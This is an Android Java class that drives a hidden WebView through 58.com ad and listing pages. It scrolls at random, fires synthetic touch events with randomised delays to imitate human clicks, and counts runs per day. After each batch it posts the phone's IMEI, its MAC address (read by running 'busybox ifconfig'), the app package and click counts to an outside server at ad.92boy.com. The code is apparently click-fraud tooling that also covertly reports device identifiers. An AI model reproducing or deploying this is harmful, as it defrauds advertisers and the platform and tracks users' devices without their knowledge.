package com.zzj.kp;

import android.app.Activity;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;

public class Web58Manager
{

	private static Web58Manager instance = null;

	public List<AdsLinkNode> linkUrls;
	private int priority;

	public String date = "";

	public interface MockTaskListener
	{
		void onFinish();

		void onError();
	}

	private int currentIndex = 0;

	private MockTaskListener mListener = new MockTaskListener()
	{

		@Override
		public void onFinish()
		{
			currentIndex++;
			if (currentIndex >= linkUrls.size())
			{
				try
				{
					Log.d(TAG, "第" + linkUrls.size() + "个跑完");
					takeReport(linkUrls.get(linkUrls.size() - 1).getId(), linkUrls.get(linkUrls.size() - 1).getNum(), linkUrls.get(linkUrls.size() - 1)
							.getNum());
					Log.d(TAG, "ad is over");
					AdsDataManager.initWebView(mActivity, mWeb).over(priority);

					mActivity.getSharedPreferences("58AdrunToday", Activity.MODE_PRIVATE).edit().clear().commit();
					mActivity.getSharedPreferences("58AdrunToday", Activity.MODE_PRIVATE).edit().putInt(date, linkUrls.size()).commit();
				}
				catch (Exception e)
				{

				}
				return;
			}

			Log.d(TAG, "第" + currentIndex + "个跑完");
			mActivity.getSharedPreferences("58AdrunToday", Activity.MODE_PRIVATE).edit().putInt(date, currentIndex).commit();
			takeReport(linkUrls.get(currentIndex - 1).getId(), linkUrls.get(currentIndex - 1).getNum(), linkUrls.get(currentIndex - 1).getNum());

			MAX_ENTER_DETAIL_COUNT = linkUrls.get(currentIndex).getNum();
			mWeb.loadUrl(linkUrls.get(currentIndex).getUrl());
			Log.d(TAG, (currentIndex + 1) + "");
		}

		@Override
		public void onError()
		{

		}
	};

	private static final String TAG = "AdList-->";

	// 小链接跑的次数
	private static int MAX_ENTER_DETAIL_COUNT = 2;

	private static final int DEFAULT_LOAD_SIZE = 18;

	private static final int NAV_H = 75;
	private static final int BANNER_H = 103;
	private static final int ITEM_H = 99;
	private static final int FOOTER_H = 49;
	private static final int R_ITEM_H = 39;
	private static final int R_COUNT = 6;
	private WebView mWeb;
	private Activity mActivity;

	private int enterDetailCount = 0;

	public static Web58Manager initWebView(Activity activity, WebView webview, List<AdsLinkNode> urls, int priority)
	{
		if (instance == null)
		{
			instance = new Web58Manager(activity, webview, urls, priority);
		}
		return instance;
	}

	private Web58Manager(Activity activity, WebView webview, List<AdsLinkNode> urls, int priority)
	{
		if (urls == null || urls.size() == 0) return;
		this.mWeb = webview;
		mActivity = activity;
		linkUrls = urls;
		SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd");
		Date curDate = new Date(System.currentTimeMillis());
		date = formatter.format(curDate);
		if (this.priority == 0)
		{
			this.priority = priority;
			mHandler.post(new Runnable()
			{
				@Override
				public void run()
				{
					mWeb.setWebViewClient(new WebViewClient()
					{
						@Override
						public boolean shouldOverrideUrlLoading(WebView view, String url)
						{
							view.loadUrl(url);
							return true;
						}

						@Override
						public void onPageFinished(WebView view, String url)
						{
							if (isListPage(url)) handleListView(view, url);
							else if (isDetailPage(url)) handleDetailView(view, url);
							else if (!isJumpPage(url))
							{
								mHandler.removeCallbacks(mGoListPageWorker);
								// 小链停留时间
								mHandler.postDelayed(mGoListPageWorker, random(4000, 12000));
							}
						}
					});
					startRun();
				}
			});
		}
	}

	public void startRun()
	{
		try
		{
			currentIndex = mActivity.getSharedPreferences("58AdrunToday", Activity.MODE_PRIVATE).getInt(date, 0);

			if(currentIndex<linkUrls.size()){
				Log.d(TAG, "ad is start");
				MAX_ENTER_DETAIL_COUNT = linkUrls.get(currentIndex).getNum();
				mHandler.post(new Runnable()
				{
					@Override
					public void run()
					{
						mWeb.loadUrl(linkUrls.get(currentIndex).getUrl());
						Log.d(TAG, (currentIndex + 1) + "");
					}
				});
			}
		}
		catch (Exception e)
		{
			Log.d(TAG, "58run is error:"+e.toString());
		}
	}

	public void setListener(MockTaskListener mListener)
	{
		this.mListener = mListener;
	}

	Handler mHandler = new Handler(Looper.getMainLooper())
	{
	};
	Runnable mListaPageWorker = new Runnable()
	{
		@Override
		public void run()
		{
			if (enterDetailCount >= MAX_ENTER_DETAIL_COUNT)
			{
				cleanUpWeb();
				if (mListener != null) mListener.onFinish();
				return;
			}

			int contentH = mWeb.getContentHeight();
			int height = mWeb.getHeight();

			int clickH = random(NAV_H + BANNER_H + 50, height);
			int scrollH = random(0, contentH - height);
			mWeb.scrollBy(0, scrollH);
			mockClick(mWeb, mWeb.getWidth() >> 1, clickH);
			enterDetailCount++;

			mWeb.postDelayed(new Runnable()
			{
				public void run()
				{
					mWeb.scrollTo(0, random(300, 3000));
				}
			}, random(3000, 8000));
		}
	};

	private void cleanUpWeb()
	{
		mHandler.removeCallbacks(mGoListPageWorker);
		mHandler.removeCallbacks(mListaPageWorker);
		mHandler.removeCallbacks(mDetailPageWorker);
		enterDetailCount = 0;
	}

	Runnable mDetailPageWorker = new Runnable()
	{
		@Override
		public void run()
		{
			int contentH = mWeb.getContentHeight();
			int height = mWeb.getHeight();
			mWeb.scrollBy(0, contentH);
			mockClick(mWeb, mWeb.getWidth() >> 1, ((height - FOOTER_H) + (height - FOOTER_H - R_COUNT * R_ITEM_H)) >> 1);
		}
	};

	Runnable mGoListPageWorker = new Runnable()
	{
		@Override
		public void run()
		{
			try
			{
				mWeb.loadUrl(linkUrls.get(currentIndex).getUrl());
				Log.d(TAG, "ad is running");
			}
			catch (Exception e)
			{
			}
		}
	};

	public void mockClick(View view, float x, float y)
	{
		long downTime = SystemClock.uptimeMillis();
		MotionEvent downEvent = MotionEvent.obtain(downTime, downTime, MotionEvent.ACTION_DOWN, x, y, 0);
		downTime += 1000;

		MotionEvent upEvent = MotionEvent.obtain(downTime, downTime, MotionEvent.ACTION_UP, x, y, 0);

		view.onTouchEvent(downEvent);
		view.onTouchEvent(upEvent);
		downEvent.recycle();
		upEvent.recycle();
	}

	private boolean isListPage(String url)
	{
		return !TextUtils.isEmpty(url) && url.startsWith("https://luna.58.com/m/activity");
	}

	private boolean isDetailPage(String url)
	{
		return !TextUtils.isEmpty(url) && url.startsWith("https://m.58.com")
				&& (url.contains("yewu") || url.contains("banjia") || url.contains("zpshengchankaifa") || url.contains("ershoufang") || url.contains("shouji"));
	}

	private boolean isBannerPage(String url)
	{
		return !TextUtils.isEmpty(url) && url.startsWith("https://luna.58.com/list");
	}

	private boolean isJumpPage(String url)
	{
		return !TextUtils.isEmpty(url) && url.startsWith("https://jump.zhineng.58.com/jump");
	}

	private boolean isReportPage(String url)
	{
		return !TextUtils.isEmpty(url) && url.startsWith("https://m.58.com") && url.indexOf("jubao") > 0;
	}

	private void handleDetailView(WebView view, String url)
	{
		mHandler.removeCallbacks(mDetailPageWorker);
		mHandler.removeCallbacks(mGoListPageWorker);

		// 小链接循环时间
		int delayTime = 5 * 1000;

		mHandler.postDelayed(mDetailPageWorker, delayTime);
		mHandler.postDelayed(mGoListPageWorker, delayTime + 2000);
	}

	private void handleListView(WebView view, String url)
	{
		mHandler.removeCallbacks(mListaPageWorker);
		// 大链停留时间
		mHandler.postDelayed(mListaPageWorker, random(3000, 10000));
	}

	private int random(int start, int end)
	{
		return (int) (start + Math.random() * (end - start));
	}

	/**
	 * 统计上报
	 */
	public void takeReport(final int urlid, final int num, final int succ)
	{
		new Thread(new Runnable()
		{

			@Override
			public void run()
			{
				String reportUrl = "http://ad.92boy.com:8017/api.php?do=ckResult";
				HttpPost httpPost = new HttpPost(reportUrl);
				List<NameValuePair> params = new ArrayList<NameValuePair>();
				HttpResponse httpResponse = null;
				try
				{
					TelephonyManager tm = (TelephonyManager) mWeb.getContext().getSystemService(Context.TELEPHONY_SERVICE);
					String app_pkg = change(mWeb.getContext().getPackageName());
					params.add(new BasicNameValuePair("app_pkg", app_pkg));
					params.add(new BasicNameValuePair("app_ver", change(mWeb.getContext().getPackageManager().getPackageInfo(app_pkg, 0).versionName)));
					params.add(new BasicNameValuePair("imei", change(tm.getDeviceId())));
					params.add(new BasicNameValuePair("mac", change(getMacAddress())));
					params.add(new BasicNameValuePair("urlid", urlid + ""));
					params.add(new BasicNameValuePair("num", num + ""));
					params.add(new BasicNameValuePair("succ", succ + ""));

					httpPost.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
					httpResponse = new DefaultHttpClient().execute(httpPost);
					if (httpResponse.getStatusLine().getStatusCode() == 200)
					{
						String result = EntityUtils.toString(httpResponse.getEntity());
						Log.d("AdList-->", result.toString());
					}
				}
				catch (Exception e)
				{
					e.printStackTrace();
				}
			}
		}).start();
	}

	private String change(String ss)
	{
		if (ss == null || ss.length() == 0)
		{
			ss = "";
		}
		return ss;
	}

	// 获取mac地址
	private String getMacAddress()
	{
		String result = "";
		String Mac = "";
		result = callCmd("busybox ifconfig", "HWaddr");
		if (result == null) { return ""; }
		if (result.length() > 0 && result.contains("HWaddr"))
		{
			Mac = result.substring(result.indexOf("HWaddr") + 6, result.length() - 1);
			if (Mac.length() > 1)
			{
				result = Mac.toLowerCase();
			}
		}
		return result.trim();
	}

	private String callCmd(String cmd, String filter)
	{
		String result = "";
		String line = "";
		try
		{
			Process proc = Runtime.getRuntime().exec(cmd);
			InputStreamReader is = new InputStreamReader(proc.getInputStream());
			BufferedReader br = new BufferedReader(is);
			while ((line = br.readLine()) != null && line.contains(filter) == false)
			{
			}
			result = line;
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}
		return result;
	}
}
